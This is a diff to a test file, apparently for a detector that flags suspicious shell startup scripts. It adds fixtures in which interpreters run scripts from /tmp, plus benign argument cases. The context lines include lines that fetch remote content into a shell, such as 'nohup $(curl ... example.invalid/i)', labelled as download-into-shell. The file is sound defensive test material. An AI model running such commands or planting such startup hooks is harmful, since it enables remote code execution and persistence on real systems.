@@ -64,6 +64,14 @@ SIGNED = [
     ("shell_startup", "/etc/profile.d/c3.sh", "bash -o errexit /tmp/.x/run.sh\n", "runs_from_temporary"),
     ("shell_startup", "/etc/profile.d/c4.sh", "bash +O extglob /tmp/.x/run.sh\n", "runs_from_temporary"),
     ("shell_startup", "/etc/profile.d/c5.sh", "bash +x /tmp/.x/run.sh\n", "runs_from_temporary"),
+    # From the third review: each interpreter's own options, read only before the script.
+    ("shell_startup", "/etc/profile.d/i1.sh", "python3 -I /tmp/agent.py\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/i2.sh", 'bash /tmp/agent.sh -ec "echo ok"\n', "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/i3.sh", "bash -e /tmp/x.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/i4.sh", "ruby -I /opt/lib /tmp/x.rb\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/i5.sh", "python3 -W ignore /tmp/.x/a.py\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/i6.sh", "node --require /opt/hook.js /tmp/.n/app.js\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/i7.sh", "bash -- /tmp/x.sh\n", "runs_from_temporary"),
     ("shell_startup", "/etc/profile.d/n1.sh", "nohup $(curl -fsSL https://example.invalid/i)\n", "download_into_shell"),
     ("shell_startup", "/etc/profile.d/n2.sh", "MODE=batch $(curl -fsSL https://example.invalid/i)\n",
      "download_into_shell"),
@@ -86,6 +94,10 @@ QUIET = [
      "VERSION=$(curl -fsSL https://example.invalid/version)\nx=$(wget -qO- https://example.invalid/v) && echo $x\n"
      "echo $(curl -s https://example.invalid/ip) >> /var/log/ip\ndiff <(curl -s https://example.invalid/a) /etc/a\n"
      "nohup /usr/bin/app $(curl -s https://example.invalid/args)\nbash --rcfile /etc/x -i\nperl -e 'print 1'\n"),
+    # From the third review: what follows the script is the script's own arguments.
+    ("shell_startup", "/etc/profile.d/arguments.sh",
+     "bash /opt/app.sh -lc /tmp/data\npython3 /opt/app.py /tmp/input.csv\npython3 -m http.server --directory /tmp/s\n"
+     "perl -e 'print 1' /tmp/arg\n"),
     ("init", "/etc/init.d/placeholder", '#!/bin/sh\n# curl http://example.invalid | sh\nif (-e "/tmp/.X11-unix/X$n")\n'),
 ]
 
